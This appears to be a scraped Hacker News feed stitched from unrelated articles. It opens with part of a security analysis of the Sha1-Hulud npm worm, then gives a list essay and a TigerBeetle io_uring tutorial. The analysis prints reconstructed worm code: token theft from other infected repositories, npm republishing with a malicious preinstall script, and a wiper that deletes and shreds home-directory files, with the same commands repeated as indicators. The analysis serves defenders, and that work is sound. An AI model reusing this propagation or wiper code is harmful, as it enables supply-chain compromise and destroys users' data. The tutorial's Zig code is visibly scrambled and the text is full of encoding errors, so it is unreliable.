&lt;p&gt;Critically, if the initial GitHub token lacks sufficient permissions, the malware searches for other compromised repositories with the same marker, allowing it to retrieve tokens from other infected systems. This creates a resilient botnet-like network where compromised systems share access tokens.&lt;/p&gt;&lt;code&gt;// How the malware network shares tokens:
async fetchToken() {
  // Search GitHub for repos with the identifying marker
  let results = await this.octokit.search.repos({
    q: '"Sha1-Hulud: The Second Coming."',
    sort: "updated"
  });
  
  // Try to retrieve tokens from compromised repos
  for (let repo of results) {
    let contents = await fetch(
      `https://raw.githubusercontent.com/${repo.owner}/${repo.name}/main/contents.json`
    );
    
    let data = JSON.parse(Buffer.from(contents, 'base64').toString());
    let token = data?.modules?.github?.token;
    
    if (token &amp;amp;&amp;amp; await validateToken(token)) {
      return token;  // Use token from another infected system
    }
  }
  return null;  // No valid tokens found in network
}
&lt;/code&gt;
&lt;p&gt;Using stolen npm tokens, the malware:&lt;/p&gt;&lt;code&gt;setup_bun.js&lt;/code&gt; loader into each package's preinstall scripts&lt;code&gt;bun_environment.js&lt;/code&gt; payload&lt;code&gt;async function updatePackage(packageInfo) {
  // Download original package
  let tarball = await fetch(packageInfo.tarballUrl);
  
  // Extract and modify package.json
  let packageJson = JSON.parse(await readFile("package.json"));
  
  // Add malicious preinstall script
  packageJson.scripts.preinstall = "node setup_bun.js";
  
  // Increment version
  let version = packageJson.version.split(".").map(Number);
  version[2] = (version[2] || 0) + 1;
  packageJson.version = version.join(".");
  
  // Bundle backdoor installer
  await writeFile("setup_bun.js", BACKDOOR_CODE);
  
  // Repackage and publish
  await Bun.$`npm publish ${modifiedPackage}`.env({
    NPM_CONFIG_TOKEN: this.token
  });
}
&lt;/code&gt;
&lt;p&gt;Our analysis uncovered a destructive payload designed to protect the malware√¢s infrastructure against takedown attempts.&lt;/p&gt;&lt;p&gt;The malware continuously monitors its access to GitHub (for exfiltration) and npm (for propagation). If an infected system loses access to both channels simultaneously, it triggers immediate data destruction on the compromised machine. On Windows, it attempts to delete all user files and overwrite disk sectors. On Unix systems, it uses &lt;code&gt;shred&lt;/code&gt; to overwrite files before deletion, making recovery nearly impossible.&lt;/p&gt;&lt;code&gt;// CRITICAL: Token validation failure triggers destruction
async function aL0() {
  let githubApi = new dq();
  let npmToken = process.env.NPM_TOKEN || await findNpmToken();
  
  // Try to find or create GitHub access
  if (!githubApi.isAuthenticated() || !githubApi.repoExists()) {
    let fetchedToken = await githubApi.fetchToken(); // Search for tokens in compromised repos
    
    if (!fetchedToken) {  // No GitHub access possible
      if (npmToken) {
        // Fallback to NPM propagation only
        await El(npmToken);
      } else {
        // DESTRUCTION TRIGGER: No GitHub AND no NPM access
        console.log("Error 12");
        if (platform === "windows") {
          // Attempts to delete all user files and overwrite disk sectors
          Bun.spawnSync(["cmd.exe", "/c", 
            "del /F /Q /S \"%USERPROFILE%*\" &amp;amp;&amp;amp; " +
            "for /d %%i in (\"%USERPROFILE%*\") do rd /S /Q \"%%i\" &amp;amp; " +
            "cipher /W:%USERPROFILE%"  // Overwrite deleted data
          ]);
        } else {
          // Attempts to shred all writable files in home directory
          Bun.spawnSync(["bash", "-c", 
            "find \"$HOME\" -type f -writable -user \"$(id -un)\" -print0 | " +
            "xargs -0 -r shred -uvz -n 1 &amp;amp;&amp;amp; " +  // Overwrite and delete
            "find \"$HOME\" -depth -type d -empty -delete"  // Remove empty dirs
          ]);
        }
        process.exit(0);
      }
    }
  }
}
&lt;/code&gt;
&lt;p&gt;This creates a dangerous scenario. If GitHub mass-deletes the malware's repositories or npm bulk-revokes compromised tokens, thousands of infected systems could simultaneously destroy user data. The distributed nature of the attack means that each infected machine independently monitors access and will trigger deletion of the user√¢s data when a takedown is detected.&lt;/p&gt;&lt;p&gt;To aid in detection and response, here is a more comprehensive list of the key indicators of compromise (IoCs) identified during our analysis.&lt;/p&gt;&lt;table&gt;&lt;row span="3"&gt;&lt;cell role="head"&gt;Type&lt;/cell&gt;&lt;cell role="head"&gt;Indicator&lt;/cell&gt;&lt;cell role="head"&gt;Description&lt;/cell&gt;&lt;/row&gt;&lt;row span="3"&gt;&lt;cell&gt;file&lt;/cell&gt;&lt;cell&gt;&lt;code&gt;bun_environment.js&lt;/code&gt;&lt;/cell&gt;&lt;cell&gt;Malicious post-install script in node_modules directories&lt;/cell&gt;&lt;/row&gt;&lt;row span="3"&gt;&lt;cell&gt;directory&lt;/cell&gt;&lt;cell&gt;&lt;code&gt;.truffler-cache/&lt;/code&gt;&lt;/cell&gt;&lt;cell&gt;Hidden directory created in user home for Trufflehog binary storage&lt;/cell&gt;&lt;/row&gt;&lt;row span="3"&gt;&lt;cell&gt;directory&lt;/cell&gt;&lt;cell&gt;&lt;code&gt;.truffler-cache/extract/&lt;/code&gt;&lt;/cell&gt;&lt;cell&gt;Temporary directory used for binary extraction&lt;/cell&gt;&lt;/row&gt;&lt;row span="3"&gt;&lt;cell&gt;file&lt;/cell&gt;&lt;cell&gt;&lt;code&gt;.truffler-cache/trufflehog&lt;/code&gt;&lt;/cell&gt;&lt;cell&gt;Downloaded Trufflehog binary (Linux/Mac)&lt;/cell&gt;&lt;/row&gt;&lt;row span="3"&gt;&lt;cell&gt;file&lt;/cell&gt;&lt;cell&gt;&lt;code&gt;.truffler-cache/trufflehog.exe&lt;/code&gt;&lt;/cell&gt;&lt;cell&gt;Downloaded Trufflehog binary (Windows)&lt;/cell&gt;&lt;/row&gt;&lt;row span="3"&gt;&lt;cell&gt;process&lt;/cell&gt;&lt;cell&gt;&lt;code&gt;del /F /Q /S "%USERPROFILE%*"&lt;/code&gt;&lt;/cell&gt;&lt;cell&gt;Windows destructive payload command&lt;/cell&gt;&lt;/row&gt;&lt;row span="3"&gt;&lt;cell&gt;process&lt;/cell&gt;&lt;cell&gt;&lt;code&gt;shred -uvz -n 1&lt;/code&gt;&lt;/cell&gt;&lt;cell&gt;Linux/Mac destructive payload command&lt;/cell&gt;&lt;/row&gt;&lt;row span="3"&gt;&lt;cell&gt;process&lt;/cell&gt;&lt;cell&gt;&lt;code&gt;cipher /W:%USERPROFILE%&lt;/code&gt;&lt;/cell&gt;&lt;cell&gt;Windows secure deletion command in payload&lt;/cell&gt;&lt;/row&gt;&lt;row span="3"&gt;&lt;cell&gt;command&lt;/cell&gt;&lt;cell&gt;&lt;code&gt;curl -fsSL https://bun.sh/install | bash&lt;/code&gt;&lt;/cell&gt;&lt;cell&gt;Suspicious Bun installation during NPM package install&lt;/cell&gt;&lt;/row&gt;&lt;row&gt;&lt;cell&gt;command&lt;/cell&gt;&lt;cell&gt;&lt;code&gt;powershell -c "irm bun.sh/install.ps1|iex"&lt;/code&gt;&lt;/cell&gt;&lt;cell&gt;Windows Bun installation via PowerShell&lt;/cell&gt;&lt;/row&gt;&lt;/table&gt;&lt;p&gt;If you are using GitLab Ultimate, you can leverage built-in security capabilities to immediately surface exposure tied to this attack within your projects.&lt;/p&gt;&lt;p&gt;First, enable Dependency Scanning to automatically analyze your project's dependencies against known vulnerability databases. If infected packages are present in your &lt;code&gt;package-lock.json&lt;/code&gt; or &lt;code&gt;yarn.lock&lt;/code&gt; files, Dependency Scanning will flag them in your pipeline results and the Vulnerability Report. For complete setup instructions, refer to the Dependency Scanning documentation.&lt;/p&gt;&lt;p&gt;Once enabled, merge requests introducing a compromised package will surface a warning before the code reaches your main branch.&lt;/p&gt;&lt;p&gt;Next, GitLab Duo Chat can be used with Dependency Scanning to provide a fast way to check your project's exposure without navigating through reports. From the dropdown, select the Security Analyst Agent and simply ask questions like:&lt;/p&gt;&lt;p&gt;The agent will query your project's vulnerability data and provide a direct answer, helping security teams triage quickly across multiple projects.&lt;/p&gt;&lt;p&gt;For teams managing many repositories, we recommend combining these approaches: use Dependency Scanning for continuous automated detection in CI/CD, and the Security Analyst Agent for ad-hoc investigation and rapid response during active incidents like this one.&lt;/p&gt;&lt;p&gt;This campaign represents an evolution in supply chain attacks where the threat of collateral damage becomes the primary defense mechanism for the attacker's infrastructure. The investigation is ongoing as we work with the community to understand the full scope and develop safe remediation strategies.&lt;/p&gt;&lt;p&gt;GitLab's automated detection systems continue to monitor for new infections and variations of this attack. By sharing our findings early, we hope to help the community respond effectively while avoiding the pitfalls created by the malware's dead man's switch design.&lt;/p&gt;&lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46070203</guid><pubDate>Thu, 27 Nov 2025 15:36:56 +0000</pubDate></item><item><title>Same-day upstream Linux support for Snapdragon 8 Elite Gen 5</title><link>https://www.qualcomm.com/developer/blog/2025/10/same-day-snapdragon-8-elite-gen-5-upstream-linux-support</link><description>&lt;doc fingerprint="e10fcdab2cdf53e4"&gt;
  &lt;main&gt;
    &lt;p&gt;You need to enable JavaScript to run this app.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46070668</guid><pubDate>Thu, 27 Nov 2025 16:19:03 +0000</pubDate></item><item><title>DeepSeekMath-V2: Towards Self-Verifiable Mathematical Reasoning [pdf]</title><link>https://github.com/deepseek-ai/DeepSeek-Math-V2/blob/main/DeepSeekMath_V2.pdf</link><description></description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46072786</guid><pubDate>Thu, 27 Nov 2025 20:03:25 +0000</pubDate></item><item><title>Underrated reasons to be thankful V</title><link>https://dynomight.net/thanks-5/</link><description>&lt;doc fingerprint="67ec982528b59eaf"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Underrated reasons to be thankful V&lt;/head&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;
        &lt;p&gt;That your dog, while she appears to love you only because she‚Äôs been adapted by evolution to appear to love you, really does love you.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;That if you‚Äôre a life form and you cook up a baby and copy your genes to them, you‚Äôll find that the genes have been degraded due to oxidative stress et al., which isn‚Äôt cause for celebration, but if you find some other hopefully-hot person and randomly swap in half of their genes, your baby will still be somewhat less fit compared to you and your hopefully-hot friend on average, but now there is variance, so if you cook up several babies, one of them might be as fit or even fitter than you, and that one will likely have more babies than your other babies have, and thus complex life can persist in a universe with increasing entropy.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;That if we wanted to, we surely could figure out which of the 300-ish strains of rhinovirus are circulating in a given area at a given time and rapidly vaccinate people to stop it and thereby finally ‚Äúcure‚Äù the common cold, and though this is too annoying to pursue right now, it seems like it‚Äôs just a matter of time.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;That if you look back at history, you see that plagues went from Europe to the Americas but not the other way, which suggests that urbanization and travel are great allies for infectious disease, and these both continue today but are held in check by sanitation and vaccines even while we have lots of tricks like UVC light and high-frequency sound and air filtration and waste monitoring and paying people to stay home that we‚Äôve barely even put in play.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;That while engineered infectious diseases loom ever-larger as a potential very big problem, we also have lots of crazier tricks we could pull out like panopticon viral screening or toilet monitors or daily individualized saliva sampling or engineered microbe-resistant surfaces or even dividing society into cells with rotating interlocks or having people walk around in little personal spacesuits, and while admittedly most of this doesn‚Äôt sound awesome, I see no reason this shouldn‚Äôt be a battle that we would win.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;That clean water, unlimited, almost free.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;That dentistry.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;That tongues.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;That radioactive atoms either release a ton of energy but also quickly stop existing‚Äîa gram of Rubidium-90 scattered around your kitchen emits as much energy as ~200,000 incandescent lightbulbs but after an hour only 0.000000113g is left‚Äîor don‚Äôt put out very much energy but keep existing for a long time‚Äîa gram of Carbon-14 only puts out the equivalent of 0.0000212 light bulbs but if you start with a gram, you‚Äôll still have 0.999879g after a year‚Äîso it isn‚Äôt actually that easy to permanently poison the environment with radiation although Cobalt-60 with its medium energy output and medium half-life is unfortunate, medical applications notwithstanding I still wish Cobalt-60 didn‚Äôt exist, screw you Cobalt-60.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;That while curing all cancer would only increase life expectancy by ~3 years and curing all heart disease would only increase life expectancy by ~3 years, and preventing all accidents would only increase life expectancy by ~1.5 years, if we did all of these at the same time and then a lot of other stuff too, eventually the effects would go nonlinear, so trying to cure cancer isn‚Äôt actually a waste of time, thankfully.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;That the peroxisome, while the mitochondria and their stupid Krebs cycle get all the attention, when a fatty-acid that‚Äôs too long for them to catabolize comes along, who you gonna call.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;That we have preferences, that there‚Äôs no agreed ordering of how good different things are, which is neat, and not something that would obviously be true for an alien species, and given our limited resources probably makes us happier on net.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;That cardamom, it is cheap but tastes expensive, if cardamom cost 1000√ó more, people would brag about how they flew to Sri Lanka so they could taste chai made with fresh cardamom and swear that it changed their whole life.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;That Gregory of Nyssa, he was right.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;That Grandma Moses, it‚Äôs not too late.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;That sleep, that probably evolution first made a low-energy mode so we don‚Äôt starve so fast and then layered on some maintenance processes, but the effect is that we live in a cycle and when things aren‚Äôt going your way it‚Äôs comforting that reality doesn‚Äôt stretch out before you indefinitely but instead you can look forward to a reset and a pause that‚Äôs somehow neither experienced nor skipped.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;That, glamorous or not, comfortable or not, cheap or not, carbon emitting or not, air travel is very safe.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;That, for most of the things you‚Äôre worried about, the markets are less worried than you and they have the better track record, though not the issue of your mortality.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;That sexual attraction to romantic love to economic unit to reproduction, it‚Äôs a strange bundle, but who are we to argue with success.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;That every symbolic expression recursively built from differentiable elementary functions has a derivative that can also be written as a recursive combination of elementary functions, although the latter expression may require vastly more terms.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;That every expression graph built from differentiable elementary functions and producing a scalar output has a gradient that can itself be written as an expression graph, and furthermore that the latter expression graph is always the same size as the first one and is easy to find, and thus that it‚Äôs possible to fit very large expression graphs to data.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;That, eerily, biological life and biological intelligence does not appear to make use of that property of expression graphs.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;That if you look at something and move your head around, you observe the entire light field, which is a five-dimensional function of three spatial coordinates and two angles, and yet if you do something fancy with lasers, somehow that entire light field can be stored on a single piece of normal two-dimensional film and then replayed later.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;That, as far as I can tell, the reason five-dimensional light fields can be stored on two-dimensional film simply cannot be explained without quite a lot of wave mechanics, a vivid example of the strangeness of this place and proof that all those physicists with their diffractions and phase conjugations really are up to something.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;That disposable plastic, littered or not, harmless when consumed as thousands of small particles or not, is popular for a reason.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;That disposable plastic, when disposed of correctly, is literally carbon sequestration, and that if/when air-derived plastic replaces dead-plankton-derived plastic, this might be incredibly convenient, although it must be said that currently the carbon in disposable plastic only represents a single-digit percentage of total carbon emissions.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;That rocks can be broken into pieces and then you can‚Äôt un-break the pieces but you can check that they came from the same rock, it‚Äôs basically cryptography.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;That the deal society has made is that if you have kids then everyone you encounter is obligated to chip in a bit to assist you, and this seems to mostly work without the need for constant grimy negotiated transactions as Econ 101 would suggest, although the exact contours of this deal seem to be a bit murky.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;That of all the humans that have ever lived, the majority lived under some kind of autocracy, with the rest distributed among tribal bands, chiefdoms, failed states, and flawed democracies, and only something like 1% enjoyed free elections and the rule of law and civil liberties and minimal corruption, yet we endured and today that number is closer to 10%, and so if you find yourself outside that set, do not lose heart.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;That if you were in two dimensions and you tried to eat something then maybe your body would split into two pieces since the whole path from mouth to anus would have to be disconnected, so be thankful you‚Äôre in three dimensions, although maybe you could have some kind of jigsaw-shaped digestive tract so your two pieces would only jiggle around or maybe you could use the same orifice for both purposes, remember that if you ever find yourself in two dimensions, I guess.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Things to argue about over the holidays instead of politics III ¬∑ lists&lt;/p&gt;
    &lt;p&gt;Underrated reasons to be thankful IV ¬∑ lists&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46073033</guid><pubDate>Thu, 27 Nov 2025 20:37:51 +0000</pubDate></item><item><title>A programmer-friendly I/O abstraction over io_uring and kqueue (2022)</title><link>https://tigerbeetle.com/blog/2022-11-23-a-friendly-abstraction-over-iouring-and-kqueue/</link><description>&lt;doc fingerprint="7a1e315b29e0178f"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;A Programmer-Friendly I/O Abstraction Over io_uring and kqueue&lt;/head&gt;
    &lt;p&gt;Consider this tale of I/O and performance. We√¢ll start with blocking I/O, explore io_uring and kqueue, and take home an event loop very similar to some software you may find familiar.&lt;/p&gt;
    &lt;p&gt;This is a twist on King√¢s talk at Software You Can Love Milan √¢22.&lt;/p&gt;
    &lt;p&gt;When you want to read from a file you might &lt;code&gt;open()&lt;/code&gt; and
then call &lt;code&gt;read()&lt;/code&gt; as many times as necessary to fill a
buffer of bytes from the file. And in the opposite direction, you call
&lt;code&gt;write()&lt;/code&gt; as many times as needed until everything is
written. It√¢s similar for a TCP client with sockets, but instead of
&lt;code&gt;open()&lt;/code&gt; you first call &lt;code&gt;socket()&lt;/code&gt; and then
&lt;code&gt;connect()&lt;/code&gt; to your server. Fun stuff.&lt;/p&gt;
    &lt;p&gt;In the real world though you can√¢t always read everything you want immediately from a file descriptor. Nor can you always write everything you want immediately to a file descriptor.&lt;/p&gt;
    &lt;p&gt;You can switch a file descriptor into non-blocking mode so the call won√¢t block while data you requested is not available. But system calls are still expensive, incurring context switches and cache misses. In fact, networks and disks have become so fast that these costs can start to approach the cost of doing the I/O itself. For the duration of time a file descriptor is unable to read or write, you don√¢t want to waste time continuously retrying read or write system calls.&lt;/p&gt;
    &lt;p&gt;So you switch to io_uring on Linux or kqueue on FreeBSD/macOS. (I√¢m skipping the generation of epoll/select users.) These APIs let you submit requests to the kernel to learn about readiness: when a file descriptor is ready to read or write. You can send readiness requests in batches (also referred to as queues). Completion events, one for each submitted request, are available in a separate queue.&lt;/p&gt;
    &lt;p&gt;Being able to batch I/O like this is especially important for TCP servers that want to multiplex reads and writes for multiple connected clients.&lt;/p&gt;
    &lt;p&gt;However in io_uring, you can even go one step further. Instead of having to call &lt;code&gt;read()&lt;/code&gt; or &lt;code&gt;write()&lt;/code&gt; in userland
after a readiness event, you can request that the kernel do the
&lt;code&gt;read()&lt;/code&gt; or &lt;code&gt;write()&lt;/code&gt; itself with a buffer you
provide. Thus almost all of your I/O is done in the kernel, amortizing
the overhead of system calls.&lt;/p&gt;
    &lt;p&gt;If you haven√¢t seen io_uring or kqueue before, you√¢d probably like an example! Consider this code: a simple, minimal, not-production-ready TCP echo server.&lt;/p&gt;
    &lt;code&gt;const std = @import("std");
const os = std.os;
const linux = os.linux;
const allocator = std.heap.page_allocator;

const State = enum{ accept, recv, send };
const Socket = struct {
: os.socket_t,
     handle: [1024]u8,
     buffer: State,
     state
 };
pub fn main() !void {
const entries = 32;
     const flags = 0;
     var ring = try linux.IO_Uring.init(entries, flags);
     defer ring.deinit();
     
var server: Socket = undefined;
     .handle = try os.socket(os.AF.INET, os.SOCK.STREAM, os.IPPROTO.TCP);
     serverdefer os.closeSocket(server.handle);
     
const port = 12345;
     var addr = std.net.Address.initIp4(.{127, 0, 0, 1}, port);
     var addr_len: os.socklen_t = addr.getOsSockLen();
     
try os.setsockopt(server.handle, os.SOL.SOCKET, os.SO.REUSEADDR, &amp;amp;std.mem.toBytes(@as(c_int, 1)));
     try os.bind(server.handle, &amp;amp;addr.any, addr_len);
     const backlog = 128;
     try os.listen(server.handle, backlog);
     
.state = .accept;
     server= try ring.accept(@ptrToInt(&amp;amp;server), server.handle, &amp;amp;addr.any, &amp;amp;addr_len, 0);
     _ 
while (true) {
     = try ring.submit_and_wait(1);
         _ 
while (ring.cq_ready() &amp;gt; 0) {
         const cqe = try ring.copy_cqe();
             var client = @intToPtr(*Socket, @intCast(usize, cqe.user_data));
             
if (cqe.res &amp;lt; 0) std.debug.panic("{}({}): {}", .{
             .state,
                 client.handle,
                 client@intToEnum(os.E, -cqe.res),
                 
             });
switch (client.state) {
             .accept =&amp;gt; {
                 = try allocator.create(Socket);
                     client .handle = @intCast(os.socket_t, cqe.res);
                     client.state = .recv;
                     client= try ring.recv(@ptrToInt(client), client.handle, .{.buffer = &amp;amp;client.buffer}, 0);
                     _ = try ring.accept(@ptrToInt(&amp;amp;server), server.handle, &amp;amp;addr.any, &amp;amp;addr_len, 0);
                     _ ,
                 }.recv =&amp;gt; {
                 const read = @intCast(usize, cqe.res);
                     .state = .send;
                     client= try ring.send(@ptrToInt(client), client.handle, client.buffer[0..read], 0);
                     _ ,
                 }.send =&amp;gt; {
                 .closeSocket(client.handle);
                     os.destroy(client);
                     allocator,
                 }
             }
         }
     } }&lt;/code&gt;
    &lt;p&gt;This is a great, minimal example. But notice that this code ties io_uring behavior directly to business logic (in this case, handling echoing data between request and response). It is fine for a small example like this. But in a large application you might want to do I/O throughout the code base, not just in one place. You might not want to keep adding business logic to this single loop.&lt;/p&gt;
    &lt;p&gt;Instead, you might want to be able to schedule I/O and pass a callback (and sometimes with some application context) to be called when the event is complete.&lt;/p&gt;
    &lt;p&gt;The interface might look like:&lt;/p&gt;
    &lt;code&gt;.dispatch({
 io_dispatch// some big struct/union with relevant fields for all event types
     , my_callback); }&lt;/code&gt;
    &lt;p&gt;This is great! Now your business logic can schedule and handle I/O no matter where in the code base it is.&lt;/p&gt;
    &lt;p&gt;Under the hood it can decide whether to use io_uring or kqueue depending on what kernel it√¢s running on. The dispatch can also batch these individual calls through io_uring or kqueue to amortize system calls. The application no longer needs to know the details.&lt;/p&gt;
    &lt;p&gt;Additionally, we can use this wrapper to stop thinking about readiness events, just I/O completion. That is, if we dispatch a read event, the io_uring implementation would actually ask the kernel to read data into a buffer. Whereas the kqueue implementation would send a √¢read√¢ readiness event, do the read back in userland, and then call our callback.&lt;/p&gt;
    &lt;p&gt;And finally, now that we√¢ve got this central dispatcher, we don√¢t need spaghetti code in a loop switching on every possible submission and completion event.&lt;/p&gt;
    &lt;p&gt;Every time we call io_uring or kqueue we both submit event requests and poll for completion events. The io_uring and kqueue APIs tie these two actions together in the same system call.&lt;/p&gt;
    &lt;p&gt;To sync our requests to io_uring or kqueue we√¢ll build a &lt;code&gt;flush&lt;/code&gt; function that submits requests and polls for
completion events. (In the next section we√¢ll talk about how the user of
the central dispatch learns about completion events.)&lt;/p&gt;
    &lt;p&gt;To make &lt;code&gt;flush&lt;/code&gt; more convenient, we√¢ll build a nice
wrapper around it so that we can submit as many requests (and process as
many completion events) as possible. To avoid accidentally blocking
indefinitely we√¢ll also introduce a time limit. We√¢ll call the wrapper
&lt;code&gt;run_for_ns&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;Finally we√¢ll put the user in charge of setting up a loop to call this &lt;code&gt;run_for_ns&lt;/code&gt; function, independent of normal program
execution.&lt;/p&gt;
    &lt;p&gt;This is now your traditional event loop.&lt;/p&gt;
    &lt;p&gt;You may have noticed that in the API above we passed a callback. The idea is that after the requested I/O has completed, our callback should be invoked. But the question remains: how to track this callback between the submission and completion queue?&lt;/p&gt;
    &lt;p&gt;Thankfully, io_uring and kqueue events have user data fields. The user data field is opaque to the kernel. When a submitted event completes, the kernel sends a completion event back to userland containing the user data value from the submission event.&lt;/p&gt;
    &lt;p&gt;We can store the callback in the user data field by setting it to the callback√¢s pointer casted to an integer. When the completion for a requested event comes up, we cast from the integer in the user data field back to the callback pointer. Then, we invoke the callback.&lt;/p&gt;
    &lt;p&gt;As described above, the struct for &lt;code&gt;io_dispatch.dispatch&lt;/code&gt;
could get quite large handling all the different kinds of I/O events and
their arguments. We could make our API a little more expressive by
creating wrapper functions for each event type.&lt;/p&gt;
    &lt;p&gt;So if we wanted to schedule a read function we could call:&lt;/p&gt;
    &lt;code&gt;.read(fd, &amp;amp;buf, nBytesToRead, callback); io_dispatch&lt;/code&gt;
    &lt;p&gt;Or to write, similarly:&lt;/p&gt;
    &lt;code&gt;.write(fd, buf, nBytesToWrite, callback); io_dispatch&lt;/code&gt;
    &lt;p&gt;One more thing we need to worry about is that the batch we pass to io_uring or kqueue has a fixed size (technically, kqueue allows any batch size but using that might introduce unnecessary allocations). So we√¢ll build our own queue on top of our I/O abstraction to keep track of requests that we could not immediately submit to io_uring or kqueue.&lt;/p&gt;
    &lt;quote&gt;&lt;p&gt;To keep this API simple we could allocate for each entry in the queue. Or we could modify the&lt;/p&gt;&lt;code&gt;io_dispatch.X&lt;/code&gt;calls slightly to accept a struct that can be used in an intrusive linked list to contain all request context, including the callback. The latter is what we do in TigerBeetle.&lt;/quote&gt;
    &lt;p&gt;Put another way: every time code calls &lt;code&gt;io_dispatch&lt;/code&gt;,
we√¢ll try to immediately submit the requested event to io_uring or
kqueue. But if there√¢s no room, we store the event in an overflow
queue.&lt;/p&gt;
    &lt;p&gt;The overflow queue needs to be processed eventually, so we update our &lt;code&gt;flush&lt;/code&gt; function (described in Callbacks and context above) to pull
as many events from our overflow queue before submitting a batch to
io_uring or kqueue.&lt;/p&gt;
    &lt;p&gt;We√¢ve now built something similar to libuv, the I/O library that Node.js uses. And if you squint, it is basically TigerBeetle√¢s I/O library! (And interestingly enough, TigerBeetle√¢s I/O code was adopted into Bun! Open-source for the win!)&lt;/p&gt;
    &lt;p&gt;Let√¢s check out how the Darwin version of TigerBeetle√¢s I/O library (with kqueue) differs from the Linux version. As mentioned, the complete &lt;code&gt;send&lt;/code&gt; call in the
Darwin implementation waits for file descriptor readiness (through
kqueue). Once ready, the actual &lt;code&gt;send&lt;/code&gt; call is made back in
userland:&lt;/p&gt;
    &lt;code&gt;pub fn send(
self: *IO,
     comptime Context: type,
     : Context,
     contextcomptime callback: fn (
     : Context,
         context: *Completion,
         completion: SendError!usize,
         resultvoid,
     ) : *Completion,
     completion: os.socket_t,
     socket: []const u8,
     buffervoid {
 ) self.submit(
     ,
         context,
         callback,
         completion.send,
         .{
         .socket = socket,
             .buf = buffer.ptr,
             .len = @intCast(u32, buffer_limit(buffer.len)),
             ,
         }struct {
         fn do_operation(op: anytype) SendError!usize {
             return os.send(op.socket, op.buf[0..op.len], 0);
                 
             },
         }
     ); }&lt;/code&gt;
    &lt;p&gt;Compare this to the Linux version (with io_uring) where the kernel handles everything and there is no send system call in userland:&lt;/p&gt;
    &lt;code&gt;pub fn send(
self: *IO,
     comptime Context: type,
     : Context,
     contextcomptime callback: fn (
     : Context,
         context: *Completion,
         completion: SendError!usize,
         resultvoid,
     ) : *Completion,
     completion: os.socket_t,
     socket: []const u8,
     buffervoid {
 ) .* = .{
     completion.io = self,
         .context = context,
         .callback = struct {
         fn wrapper(ctx: ?*anyopaque, comp: *Completion, res: *const anyopaque) void {
             
                 callback(@intToPtr(Context, @ptrToInt(ctx)),
                     ,
                     comp@intToPtr(*const SendError!usize, @ptrToInt(res)).*,
                     
                 );
             }.wrapper,
         }.operation = .{
         .send = .{
             .socket = socket,
                 .buffer = buffer,
                 ,
             },
         }
     };// Fill out a submission immediately if possible, otherwise adds to overflow buffer
     self.enqueue(completion);
      }&lt;/code&gt;
    &lt;p&gt;Similarly, take a look at &lt;code&gt;flush&lt;/code&gt; on Linux
and macOS
for event processing. Look at &lt;code&gt;run_for_ns&lt;/code&gt; on Linux
and macOS
for the public API users must call. And finally, look at what puts this
all into practice, the loop calling &lt;code&gt;run_for_ns&lt;/code&gt; in
src/main.zig.&lt;/p&gt;
    &lt;p&gt;We√¢ve come this far and you might be wondering √¢ what about cross-platform support for Windows? The good news is that Windows also has a completion based system similar to io_uring but without batching, called IOCP. And for bonus points, TigerBeetle provides the same I/O abstraction over it! But it√¢s enough to cover just Linux and macOS in this post. :)&lt;/p&gt;
